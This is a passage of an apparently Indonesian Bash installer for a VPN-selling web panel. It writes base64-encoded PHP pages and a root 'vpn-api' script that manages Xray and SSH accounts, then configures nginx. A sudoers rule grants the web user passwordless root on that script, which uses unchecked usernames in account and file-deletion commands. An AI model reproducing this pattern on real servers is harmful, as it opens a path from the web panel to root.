3M9ImNhcmQtdGl0bGUiPvCfk6cgRW1haWwgU01UUCAoR21haWwpPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTouNzhyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbi1ib3R0b206Ljc1cmVtIj5VbnR1ayBPVFAgdmVyaWZpa2FzaS4gR21haWw6IGFrdGlma2FuIDJGQSDihpIgYnVhdCBBcHAgUGFzc3dvcmQgZGkgbXlhY2NvdW50Lmdvb2dsZS5jb20vc2VjdXJpdHk8L3A+CiAgICAgICAgPGRpdiBjbGFzcz0iZ3JpZDMiPgogICAgICAgICAgPGRpdj48bGFiZWw+U01UUCBIb3N0PC9sYWJlbD48aW5wdXQgbmFtZT0ic210cF9ob3N0IiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdzbXRwX2hvc3QnLCdzbXRwLmdtYWlsLmNvbScpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPlBvcnQ8L2xhYmVsPjxpbnB1dCBuYW1lPSJzbXRwX3BvcnQiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3NtdHBfcG9ydCcsJzU4NycpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkVtYWlsIFBlbmdpcmltPC9sYWJlbD48aW5wdXQgbmFtZT0ic210cF9mcm9tIiBwbGFjZWhvbGRlcj0ibm9yZXBseUBnbWFpbC5jb20iIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3NtdHBfZnJvbScpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPlVzZXJuYW1lIEdtYWlsPC9sYWJlbD48aW5wdXQgbmFtZT0ic210cF91c2VyIiBwbGFjZWhvbGRlcj0iZW1haWxAZ21haWwuY29tIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdzbXRwX3VzZXInKSk/PiI+PC9kaXY+CiAgICAgICAgICA8ZGl2PjxsYWJlbD5BcHAgUGFzc3dvcmQgR21haWw8L2xhYmVsPjxpbnB1dCBuYW1lPSJzbXRwX3Bhc3MiIHR5cGU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0ieHh4eCB4eHh4IHh4eHggeHh4eCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnc210cF9wYXNzJykpPz4iPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj7wn6SWIFRlbGVncmFtIEJvdCBOb3RpZmlrYXNpPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPGRpdiBjbGFzcz0iZ3JpZDIiPgogICAgICAgICAgPGRpdj48bGFiZWw+Qm90IFRva2VuPC9sYWJlbD48aW5wdXQgbmFtZT0idGdfYm90X3Rva2VuIiBwbGFjZWhvbGRlcj0iMTIzNDU2OkFCQy4uLiIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygndGdfYm90X3Rva2VuJykpPz4iPjwvZGl2PgogICAgICAgICAgPGRpdj48bGFiZWw+Q2hhdCBJRCBBZG1pbjwvbGFiZWw+PGlucHV0IG5hbWU9InRnX2NoYXRfaWQiIHBsYWNlaG9sZGVyPSItMTAwLi4uIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCd0Z19jaGF0X2lkJykpPz4iPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj7imqEgUGVuZ2F0dXJhbiBUcmlhbDwvZGl2PjwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgIDxkaXYgY2xhc3M9ImdyaWQyIj4KICAgICAgICAgIDxkaXY+PGxhYmVsPkR1cmFzaSBUcmlhbCAoamFtKTwvbGFiZWw+PGlucHV0IG5hbWU9InRyaWFsX2R1cmF0aW9uX2hvdXJzIiB0eXBlPSJudW1iZXIiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKGdldFNldHRpbmcoJ3RyaWFsX2R1cmF0aW9uX2hvdXJzJywnMScpKT8+Ij48L2Rpdj4KICAgICAgICAgIDxkaXY+PGxhYmVsPlF1b3RhIFRyaWFsIChHQik8L2xhYmVsPjxpbnB1dCBuYW1lPSJ0cmlhbF9xdW90YV9nYiIgdHlwZT0ibnVtYmVyIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCd0cmlhbF9xdW90YV9nYicsJzEnKSk/PiI+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgc3R5bGU9IndpZHRoOjEwMCU7cGFkZGluZzouODc1cmVtO2ZvbnQtc2l6ZTouOXJlbTttYXJnaW4tdG9wOi41cmVtIj7wn5K+IFNpbXBhbiBTZW11YSBQZW5nYXR1cmFuPC9idXR0b24+CiAgICA8L2Zvcm0+CiAgPC9kaXY+Cgo8L2Rpdj48IS0tIC5jb250ZW50IC0tPgo8c2NyaXB0PgpmdW5jdGlvbiBzaG93VGFiKHQpewogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5wYWdlJykuZm9yRWFjaChwPT5wLmNsYXNzTGlzdC5yZW1vdmUoJ2FjdGl2ZScpKTsKICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcudGFiLWJ0bicpLmZvckVhY2goYj0+Yi5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKSk7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RhYi0nK3QpLmNsYXNzTGlzdC5hZGQoJ2FjdGl2ZScpOwogIGV2ZW50LnRhcmdldC5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsKfQo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cg==" | base64 -d > "$DIR"/admin/index.php
    # cron/expire_accounts.php
    echo "PD9waHAKLy8gQ3JvbjogamFsYW5rYW4gc2V0aWFwIGphbSB2aWEgY3JvbnRhYgovLyAwICogKiAqICogcGhwIC92YXIvd3d3L2h0bWwvb3JkZXJ2cG4vY3Jvbi9leHBpcmVfYWNjb3VudHMucGhwCnJlcXVpcmVfb25jZSBfX0RJUl9fLicvLi4vaW5jbHVkZXMvY29uZmlnLnBocCc7CnJlcXVpcmVfb25jZSBfX0RJUl9fLicvLi4vaW5jbHVkZXMvdnBuX21hbmFnZXIucGhwJzsKJGNvdW50ID0gVlBOTWFuYWdlcjo6cHJvY2Vzc0V4cGlyZWRBY2NvdW50cygpOwplY2hvIGRhdGUoJ1ktbS1kIEg6aTpzJykuIiDigJQgRXhwaXJlZCB7JGNvdW50fSBhY2NvdW50c1xuIjsK" | base64 -d > "$DIR"/cron/expire_accounts.php
    sed -i "s/define('DB_PASS', 'password123')/define('DB_PASS', '${DB_PASS}')/g" "$DIR/includes/config.php"
}

_ordervpn_deploy_bridge() {
    local BRIDGE="/usr/local/bin/vpn-api"
    echo "IyEvYmluL2Jhc2gKWFJBWV9DT05GSUc9Ii91c3IvbG9jYWwvZXRjL3hyYXkvY29uZmlnLmpzb24iCkFLVU5fRElSPSIvcm9vdC9ha3VuIgpQVUJMSUNfSFRNTD0iL3Zhci93d3cvaHRtbCIKQUNUSU9OPSIkMSI7IFBST1RPQ09MPSIkMiI7IFVTRVJOQU1FPSIkMyI7IERBWVM9IiQ0IjsgUVVPVEE9IiR7NTotMTAwfSI7IElQTElNSVQ9IiR7NjotMn0iCmNhc2UgIiRBQ1RJT04iIGluCiAgICBjcmVhdGUpCiAgICAgICAgW1sgLXogIiRVU0VSTkFNRSIgfHwgLXogIiREQVlTIiB8fCAteiAiJFBST1RPQ09MIiBdXSAmJiB7IGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJQYXJhbWV0ZXIgdGlkYWsgbGVuZ2thcCJ9JzsgZXhpdCAxOyB9CiAgICAgICAgVVVJRD0kKGNhdCAvcHJvYy9zeXMva2VybmVsL3JhbmRvbS91dWlkKQogICAgICAgIEVYUD0kKGRhdGUgLWQgIiske0RBWVN9IGRheXMiICsiJWQgJWIsICVZIik7IENSRUFURUQ9JChkYXRlICsiJWQgJWIsICVZIikKICAgICAgICBJUF9WUFM9JChjdXJsIC1zIC0tbWF4LXRpbWUgNSBpZmNvbmZpZy5tZSAyPi9kZXYvbnVsbCB8fCBob3N0bmFtZSAtSSB8IGF3ayAne3ByaW50ICQxfScpCiAgICAgICAgRE9NQUlOPSQoY2F0IC9ldGMveHJheS9kb21haW4gMj4vZGV2L251bGwgfCB0ciAtZCAnXG5ccicgfCB4YXJncykKICAgICAgICBpZiBbWyAiJFBST1RPQ09MIiA9PSAic3NoIiBdXTsgdGhlbgogICAgICAgICAgICBFWFBfREFURT0kKGRhdGUgLWQgIiske0RBWVN9IGRheXMiICsiJVktJW0tJWQiKQogICAgICAgICAgICB1c2VyYWRkIC1NIC1zIC9iaW4vZmFsc2UgLWUgIiRFWFBfREFURSIgIiRVU0VSTkFNRSIgMj4vZGV2L251bGwKICAgICAgICAgICAgUEFTU1dPUkQ9IiR7VVVJRDowOjEyfSI7IGVjaG8gIiR7VVNFUk5BTUV9OiR7UEFTU1dPUkR9IiB8IGNocGFzc3dkIDI+L2Rldi9udWxsCiAgICAgICAgICAgIG1rZGlyIC1wICIkQUtVTl9ESVIiCiAgICAgICAgICAgIHByaW50ZiAiVVVJRD0lc1xuUVVPVEE9JXNcbklQTElNSVQ9JXNcbkVYUElSRUQ9JXNcbkNSRUFURUQ9JXNcbiIgIiRQQVNTV09SRCIgIiRRVU9UQSIgIiRJUExJTUlUIiAiJEVYUCIgIiRDUkVBVEVEIiA+ICIkQUtVTl9ESVIvc3NoLSR7VVNFUk5BTUV9LnR4dCIKICAgICAgICAgICAgZWNobyAie1wic3VjY2Vzc1wiOnRydWUsXCJwcm90b2NvbFwiOlwic3NoXCIsXCJ1c2VybmFtZVwiOlwiJHtVU0VSTkFNRX1cIixcInBhc3N3b3JkXCI6XCIke1BBU1NXT1JEfVwiLFwiaXBcIjpcIiR7SVBfVlBTfVwiLFwiZG9tYWluXCI6XCIke0RPTUFJTn1cIixcImV4cGlyZWRcIjpcIiR7RVhQfVwiLFwibGlua19jb25maWdcIjpcInNzaDovL1wiLFwidXVpZFwiOlwiJHtQQVNTV09SRH1cIn0iCiAgICAgICAgICAgIGV4aXQgMAogICAgICAgIGZpCiAgICAgICAgVEVNUD0kKG1rdGVtcCkKICAgICAgICBpZiBbWyAiJFBST1RPQ09MIiA9PSAidm1lc3MiIF1dOyB0aGVuCiAgICAgICAgICAgIGpxIC0tYXJnIHV1aWQgIiRVVUlEIiAtLWFyZyBlbWFpbCAiJFVTRVJOQU1FIiAnKC5pbmJvdW5kc1tdfHNlbGVjdCgudGFnfHN0YXJ0c3dpdGgoInZtZXNzIikpLnNldHRpbmdzLmNsaWVudHMpKz1beyJpZCI6JHV1aWQsImVtYWlsIjokZW1haWwsImFsdGVySWQiOjB9XScgIiRYUkFZX0NPTkZJRyIgPiAiJFRFTVAiIDI+L2Rldi9udWxsCiAgICAgICAgZWxpZiBbWyAiJFBST1RPQ09MIiA9PSAidmxlc3MiIF1dOyB0aGVuCiAgICAgICAgICAgIGpxIC0tYXJnIHV1aWQgIiRVVUlEIiAtLWFyZyBlbWFpbCAiJFVTRVJOQU1FIiAnKC5pbmJvdW5kc1tdfHNlbGVjdCgudGFnfHN0YXJ0c3dpdGgoInZsZXNzIikpLnNldHRpbmdzLmNsaWVudHMpKz1beyJpZCI6JHV1aWQsImVtYWlsIjokZW1haWx9XScgIiRYUkFZX0NPTkZJRyIgPiAiJFRFTVAiIDI+L2Rldi9udWxsCiAgICAgICAgZWxpZiBbWyAiJFBST1RPQ09MIiA9PSAidHJvamFuIiBdXTsgdGhlbgogICAgICAgICAgICBqcSAtLWFyZyBwYXNzd29yZCAiJFVVSUQiIC0tYXJnIGVtYWlsICIkVVNFUk5BTUUiICcoLmluYm91bmRzW118c2VsZWN0KC50YWd8c3RhcnRzd2l0aCgidHJvamFuIikpLnNldHRpbmdzLmNsaWVudHMpKz1beyJwYXNzd29yZCI6JHBhc3N3b3JkLCJlbWFpbCI6JGVtYWlsfV0nICIkWFJBWV9DT05GSUciID4gIiRURU1QIiAyPi9kZXYvbnVsbAogICAgICAgIGZpCiAgICAgICAgW1sgISAtcyAiJFRFTVAiIF1dICYmIHsgcm0gLWYgIiRURU1QIjsgZWNobyAneyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkdhZ2FsIHVwZGF0ZSBYcmF5IGNvbmZpZyJ9JzsgZXhpdCAxOyB9CiAgICAgICAganEgZW1wdHkgIiRURU1QIiAyPi9kZXYvbnVsbCB8fCB7IHJtIC1mICIkVEVNUCI7IGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJKU09OIHRpZGFrIHZhbGlkIn0nOyBleGl0IDE7IH0KICAgICAgICBtdiAiJFRFTVAiICIkWFJBWV9DT05GSUciOyBjaG1vZCA2NDQgIiRYUkFZX0NPTkZJRyIKICAgICAgICB4cmF5IC10ZXN0IC1jb25maWcgIiRYUkFZX0NPTkZJRyIgPi9kZXYvbnVsbCAyPiYxIHx8IHsgZWNobyAneyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IlhyYXkgY29uZmlnIHRlc3QgZ2FnYWwifSc7IGV4aXQgMTsgfQogICAgICAgIHN5c3RlbWN0bCByZXN0YXJ0IHhyYXkgPi9kZXYvbnVsbCAyPiYxOyBzbGVlcCAxCiAgICAgICAgbWtkaXIgLXAgIiRBS1VOX0RJUiIKICAgICAgICBwcmludGYgIlVVSUQ9JXNcblFVT1RBPSVzXG5JUExJTUlUPSVzXG5FWFBJUkVEPSVzXG5DUkVBVEVEPSVzXG4iICIkVVVJRCIgIiRRVU9UQSIgIiRJUExJTUlUIiAiJEVYUCIgIiRDUkVBVEVEIiA+ICIkQUtVTl9ESVIvJHtQUk9UT0NPTH0tJHtVU0VSTkFNRX0udHh0IgogICAgICAgIGlmIFtbICIkUFJPVE9DT0wiID09ICJ2bWVzcyIgXV07IHRoZW4KICAgICAgICAgICAgSl9UTFM9JChwcmludGYgJ3sidiI6IjIiLCJwcyI6IiVzIiwiYWRkIjoiYnVnLmNvbSIsInBvcnQiOiI0NDMiLCJpZCI6IiVzIiwiYWlkIjoiMCIsIm5ldCI6IndzIiwicGF0aCI6Ii92bWVzcyIsInR5cGUiOiJub25lIiwiaG9zdCI6IiVzIiwidGxzIjoidGxzIn0nICIkVVNFUk5BTUUiICIkVVVJRCIgIiRET01BSU4iKQogICAgICAgICAgICBMSU5LX1RMUz0idm1lc3M6Ly8kKHByaW50ZiAnJXMnICIkSl9UTFMifGJhc2U2NCAtdyAwKSIKICAgICAgICAgICAgSl9OT05UTFM9JChwcmludGYgJ3sidiI6IjIiLCJwcyI6IiVzIiwiYWRkIjoiYnVnLmNvbSIsInBvcnQiOiI4MCIsImlkIjoiJXMiLCJhaWQiOiIwIiwibmV0Ijoid3MiLCJwYXRoIjoiL3ZtZXNzIiwidHlwZSI6Im5vbmUiLCJob3N0IjoiJXMiLCJ0bHMiOiJub25lIn0nICIkVVNFUk5BTUUiICIkVVVJRCIgIiRET01BSU4iKQogICAgICAgICAgICBMSU5LX05PTlRMUz0idm1lc3M6Ly8kKHByaW50ZiAnJXMnICIkSl9OT05UTFMifGJhc2U2NCAtdyAwKSIKICAgICAgICAgICAgSl9HUlBDPSQocHJpbnRmICd7InYiOiIyIiwicHMiOiIlcyIsImFkZCI6IiVzIiwicG9ydCI6IjQ0MyIsImlkIjoiJXMiLCJhaWQiOiIwIiwibmV0IjoiZ3JwYyIsInBhdGgiOiJ2bWVzcy1ncnBjIiwidHlwZSI6Im5vbmUiLCJob3N0IjoiYnVnLmNvbSIsInRscyI6InRscyJ9JyAiJFVTRVJOQU1FIiAiJERPTUFJTiIgIiRVVUlEIikKICAgICAgICAgICAgTElOS19HUlBDPSJ2bWVzczovLyQocHJpbnRmICclcycgIiRKX0dSUEMifGJhc2U2NCAtdyAwKSIKICAgICAgICBlbGlmIFtbICIkUFJPVE9DT0wiID09ICJ2bGVzcyIgXV07IHRoZW4KICAgICAgICAgICAgTElOS19UTFM9InZsZXNzOi8vJHtVVUlEfUBidWcuY29tOjQ0Mz9wYXRoPSUyRnZsZXNzJnNlY3VyaXR5PXRscyZlbmNyeXB0aW9uPW5vbmUmaG9zdD0ke0RPTUFJTn0mdHlwZT13cyZzbmk9JHtET01BSU59IyR7VVNFUk5BTUV9LVRMUyIKICAgICAgICAgICAgTElOS19OT05UTFM9InZsZXNzOi8vJHtVVUlEfUBidWcuY29tOjgwP3BhdGg9JTJGdmxlc3Mmc2VjdXJpdHk9bm9uZSZlbmNyeXB0aW9uPW5vbmUmaG9zdD0ke0RPTUFJTn0mdHlwZT13cyMke1VTRVJOQU1FfS1Ob25UTFMiCiAgICAgICAgICAgIExJTktfR1JQQz0idmxlc3M6Ly8ke1VVSUR9QCR7RE9NQUlOfTo0NDM/bW9kZT1ndW4mc2VjdXJpdHk9dGxzJmVuY3J5cHRpb249bm9uZSZ0eXBlPWdycGMmc2VydmljZU5hbWU9dmxlc3MtZ3JwYyZzbmk9YnVnLmNvbSMke1VTRVJOQU1FfS1nUlBDIgogICAgICAgIGVsaWYgW1sgIiRQUk9UT0NPTCIgPT0gInRyb2phbiIgXV07IHRoZW4KICAgICAgICAgICAgTElOS19UTFM9InRyb2phbjovLyR7VVVJRH1AYnVnLmNvbTo0NDM/cGF0aD0lMkZ0cm9qYW4mc2VjdXJpdHk9dGxzJmhvc3Q9JHtET01BSU59JnR5cGU9d3Mmc25pPSR7RE9NQUlOfSMke1VTRVJOQU1FfS1UTFMiCiAgICAgICAgICAgIExJTktfTk9OVExTPSJ0cm9qYW46Ly8ke1VVSUR9QGJ1Zy5jb206ODA/cGF0aD0lMkZ0cm9qYW4mc2VjdXJpdHk9bm9uZSZob3N0PSR7RE9NQUlOfSZ0eXBlPXdzIyR7VVNFUk5BTUV9LU5vblRMUyIKICAgICAgICAgICAgTElOS19HUlBDPSJ0cm9qYW46Ly8ke1VVSUR9QCR7RE9NQUlOfTo0NDM/bW9kZT1ndW4mc2VjdXJpdHk9dGxzJnR5cGU9Z3JwYyZzZXJ2aWNlTmFtZT10cm9qYW4tZ3JwYyZzbmk9YnVnLmNvbSMke1VTRVJOQU1FfS1nUlBDIgogICAgICAgIGZpCiAgICAgICAgcHJpbnRmICd7InN1Y2Nlc3MiOnRydWUsInByb3RvY29sIjoiJXMiLCJ1c2VybmFtZSI6IiVzIiwidXVpZCI6IiVzIiwiaXAiOiIlcyIsImRvbWFpbiI6IiVzIiwiZXhwaXJlZCI6IiVzIiwibGlua190bHMiOiIlcyIsImxpbmtfbm9udGxzIjoiJXMiLCJsaW5rX2dycGMiOiIlcyIsImRvd25sb2FkIjoiaHR0cDovLyVzOjgxLyVzLSVzLnR4dCJ9XG4nIFwKICAgICAgICAgICAgIiRQUk9UT0NPTCIgIiRVU0VSTkFNRSIgIiRVVUlEIiAiJElQX1ZQUyIgIiRET01BSU4iICIkRVhQIiAiJExJTktfVExTIiAiJExJTktfTk9OVExTIiAiJExJTktfR1JQQyIgIiRJUF9WUFMiICIkUFJPVE9DT0wiICIkVVNFUk5BTUUiCiAgICAgICAgZXhpdCAwIDs7CiAgICBkZWxldGUpCiAgICAgICAgW1sgLXogIiRQUk9UT0NPTCIgfHwgLXogIiRVU0VSTkFNRSIgXV0gJiYgeyBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiUGFyYW1ldGVyIHRpZGFrIGxlbmdrYXAifSc7IGV4aXQgMTsgfQogICAgICAgIGlmIFtbICIkUFJPVE9DT0wiID09ICJzc2giIF1dOyB0aGVuCiAgICAgICAgICAgIHVzZXJkZWwgLWYgIiRVU0VSTkFNRSIgMj4vZGV2L251bGwKICAgICAgICBlbHNlCiAgICAgICAgICAgIFRFTVA9JChta3RlbXApCiAgICAgICAgICAgIGpxIC0tYXJnIGVtYWlsICIkVVNFUk5BTUUiICdkZWwoLmluYm91bmRzW10uc2V0dGluZ3MuY2xpZW50c1tdP3xzZWxlY3QoLmVtYWlsPT0kZW1haWwpKScgIiRYUkFZX0NPTkZJRyIgPiAiJFRFTVAiIDI+L2Rldi9udWxsCiAgICAgICAgICAgIGlmIFtbIC1zICIkVEVNUCIgXV0gJiYganEgZW1wdHkgIiRURU1QIiAyPi9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICAgICAgbXYgIiRURU1QIiAiJFhSQVlfQ09ORklHIgogICAgICAgICAgICAgICAgeHJheSAtdGVzdCAtY29uZmlnICIkWFJBWV9DT05GSUciID4vZGV2L251bGwgMj4mMSAmJiBzeXN0ZW1jdGwgcmVzdGFydCB4cmF5ID4vZGV2L251bGwgMj4mMQogICAgICAgICAgICBlbHNlIHJtIC1mICIkVEVNUCI7IGZpCiAgICAgICAgZmkKICAgICAgICBybSAtZiAiJEFLVU5fRElSLyR7UFJPVE9DT0x9LSR7VVNFUk5BTUV9LnR4dCIgIiRQVUJMSUNfSFRNTC8ke1BST1RPQ09MfS0ke1VTRVJOQU1FfS50eHQiCiAgICAgICAgZWNobyAneyJzdWNjZXNzIjp0cnVlLCJtZXNzYWdlIjoiQWt1biBiZXJoYXNpbCBkaWhhcHVzIn0nIDs7CiAgICBzdGF0dXMpCiAgICAgICAgcHJpbnRmICd7InhyYXkiOiIlcyIsIm5naW54IjoiJXMiLCJoYXByb3h5IjoiJXMiLCJkb21haW4iOiIlcyIsImlwIjoiJXMifVxuJyBcCiAgICAgICAgICAgICIkKHN5c3RlbWN0bCBpcy1hY3RpdmUgeHJheSAyPi9kZXYvbnVsbCkiICIkKHN5c3RlbWN0bCBpcy1hY3RpdmUgbmdpbnggMj4vZGV2L251bGwpIiBcCiAgICAgICAgICAgICIkKHN5c3RlbWN0bCBpcy1hY3RpdmUgaGFwcm94eSAyPi9kZXYvbnVsbCkiIFwKICAgICAgICAgICAgIiQoY2F0IC9ldGMveHJheS9kb21haW4gMj4vZGV2L251bGx8dHIgLWQgJ1xuXHInfHhhcmdzKSIgXAogICAgICAgICAgICAiJChjdXJsIC1zIC0tbWF4LXRpbWUgNSBpZmNvbmZpZy5tZSAyPi9kZXYvbnVsbHx8aG9zdG5hbWUgLUl8YXdrICd7cHJpbnQgJDF9JykiIDs7CiAgICBsaXN0KQogICAgICAgIFtbIC16ICIkUFJPVE9DT0wiIF1dICYmIFBST1RPQ09MPSIqIjsgZWNobyAiWyI7IEZJUlNUPTE7IHNob3B0IC1zIG51bGxnbG9iCiAgICAgICAgZm9yIGYgaW4gIiRBS1VOX0RJUiIvJHtQUk9UT0NPTH0tKi50eHQ7IGRvCiAgICAgICAgICAgIFtbICEgLWYgIiRmIiBdXSAmJiBjb250aW51ZQogICAgICAgICAgICBGTkFNRT0kKGJhc2VuYW1lICIkZiIgLnR4dCk7IFBST1RPPSIke0ZOQU1FJSUtKn0iOyBVTkFNRT0iJHtGTkFNRSMqLX0iCiAgICAgICAgICAgIEVYUF9JTkZPPSQoZ3JlcCAiRVhQSVJFRD0iICIkZiIgMj4vZGV2L251bGx8Y3V0IC1kPSAtZjItKQogICAgICAgICAgICBVVUlEX0lORk89JChncmVwICJVVUlEPSIgIiRmIiAyPi9kZXYvbnVsbHxjdXQgLWQ9IC1mMi0pCiAgICAgICAgICAgIFtbICRGSVJTVCAtZXEgMCBdXSAmJiBlY2hvICIsIgogICAgICAgICAgICBwcmludGYgJ3sicHJvdG9jb2wiOiIlcyIsInVzZXJuYW1lIjoiJXMiLCJleHBpcmVkIjoiJXMiLCJ1dWlkIjoiJXMifScgIiRQUk9UTyIgIiRVTkFNRSIgIiRFWFBfSU5GTyIgIiRVVUlEX0lORk8iCiAgICAgICAgICAgIEZJUlNUPTAKICAgICAgICBkb25lOyBzaG9wdCAtdSBudWxsZ2xvYjsgZWNobyAiIjsgZWNobyAiXSIgOzsKICAgICopIGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJBY3Rpb24gdGlkYWsgZGlrZW5hbCJ9JyA7Owplc2FjCg==" | base64 -d > "$BRIDGE"
    chmod +x "$BRIDGE"
    cat > /etc/sudoers.d/ordervpn-api << 'SUDOEOF'
www-data ALL=(root) NOPASSWD: /usr/local/bin/vpn-api
SUDOEOF
    chmod 440 /etc/sudoers.d/ordervpn-api
}

_ordervpn_setup_nginx() {
    local PORT="${1:-8888}"
    local SUB="${2:-}"
    local DIR="/var/www/html/ordervpn"
    local PHP_SOCK=""
    for sock in /var/run/php/php*.fpm.sock; do [[ -S "$sock" ]] && { PHP_SOCK="unix:$sock"; break; }; done
    [[ -z "$PHP_SOCK" ]] && PHP_SOCK="unix:/var/run/php/php8.1-fpm.sock"
    cat > /etc/nginx/sites-available/ordervpn << NGINXEOF
server {
    listen ${PORT};
    listen [::]:${PORT};
    server_name _;
    root ${DIR};
    index index.php;
    charset utf-8;
    client_max_body_size 5M;
    location ~ /includes/ { deny all; }
    location ~ /cron/     { deny all; }
    location ~ /\.ht      { deny all; }
    location / { try_files \$uri \$uri/ /index.php?\$query_string; }
    location ~ \.php$ {
        try_files \$uri =404;
        fastcgi_split_path_info ^(.+\.php)(/.+)\$;
        fastcgi_pass ${PHP_SOCK};
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME \$realpath_root\$fastcgi_script_name;
        include fastcgi_params;
        fastcgi_read_timeout 120;
    }
}
NGINXEOF
    ln -sf /etc/nginx/sites-available/ordervpn /etc/nginx/sites-enabled/ordervpn 2>/dev/null
    if [[ -n "$SUB" ]]; then
        cat > /etc/nginx/sites-available/ordervpn-domain << NGINXEOF2
server {
    listen 80;
    server_name ${SUB};
    root ${DIR};
    index index.php;
    charset utf-8;
    client_max_body_size 5M;
    location ~ /includes/ { deny all; }
    location ~ /cron/     { deny all; }
    location ~ /\.ht      { deny all; }
    location / { try_files \$uri \$uri/ /index.php?\$query_string; }
    location ~ \.php$ {
        try_files \$uri =404;
        fastcgi_split_path_info ^(.+\.php)(/.+)\$;
        fastcgi_pass ${PHP_SOCK};
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME \$realpath_root\$fastcgi_script_name;
        include fastcgi_params;
        fastcgi_read_timeout 120;
    }
}
NGINXEOF2
        ln -sf /etc/nginx/sites-available/ordervpn-domain /etc/nginx/sites-enabled/ordervpn-domain 2>/dev/null
    fi
    systemctl start php*-fpm 2>/dev/null; systemctl enable php*-fpm 2>/dev/null || true
    nginx -t 2>/dev/null && systemctl reload nginx 2>/dev/null
}

menu_ordervpn() {
    local LOG="/var/log/ordervpn-install.log"
    while true; do
        clear
        print_menu_header "ORDERVPN WEB PANEL v2.0"
        local IP_NOW; IP_NOW=$(get_ip 2>/dev/null || hostname -I | awk "{print \$1}")
        # Tampilkan URL dengan domain jika ada, fallback ke IP
        local DISPLAY_HOST="$IP_NOW"
        [[ -n "$DOMAIN" ]] && DISPLAY_HOST="$DOMAIN"
        if [[ -f /var/www/html/ordervpn/index.php ]]; then
            printf "  Status : ${GREEN}✔ Terinstall${NC}\n"
            printf "  URL    : ${CYAN}http://%s:8888${NC}\n" "$DISPLAY_HOST"
            [[ -n "$DOMAIN" ]] && printf "  Domain : ${CYAN}http://%s${NC} (jika sudah setup subdomain)\n" "$DOMAIN"
        else
            printf "  Status : ${RED}✘ Belum diinstall${NC}\n"
        fi
        echo ""
        printf "  ${WHITE}[1]${NC} Install / Reinstall OrderVPN\n"
        printf "  ${WHITE}[2]${NC} Test vpn-api bridge + cek DB\n"
        printf "  ${WHITE}[3]${NC} Restart PHP-FPM + Nginx (port 8888)\n"
        printf "  ${WHITE}[4]${NC} Lihat log instalasi\n"
        printf "  ${WHITE}[5]${NC} Setup subdomain custom\n"
        printf "  ${WHITE}[6]${NC} Uninstall OrderVPN\n"
        printf "  ${WHITE}[7]${NC} Rebuild vpn-api bridge\n"
        printf "  ${WHITE}[8]${NC} Tampilkan kredensial DB\n"
        printf "  ${RED}[0]${NC} Kembali ke Menu\n"
        echo ""
        read -p "  Select: " ovpn_choice
        case $ovpn_choice in
            1) _ordervpn_install ;;
            2)
                clear; print_menu_header "TEST VPN-API BRIDGE"
                if [[ -x /usr/local/bin/vpn-api ]]; then
                    echo -e "  ${CYAN}→ Status services:${NC}"
                    /usr/local/bin/vpn-api status 2>/dev/null | python3 -m json.tool 2>/dev/null || /usr/local/bin/vpn-api status
                    echo ""
                    if [[ -f /root/.ordervpn_db ]]; then
                        # shellcheck disable=SC1091
                        source /root/.ordervpn_db 2>/dev/null
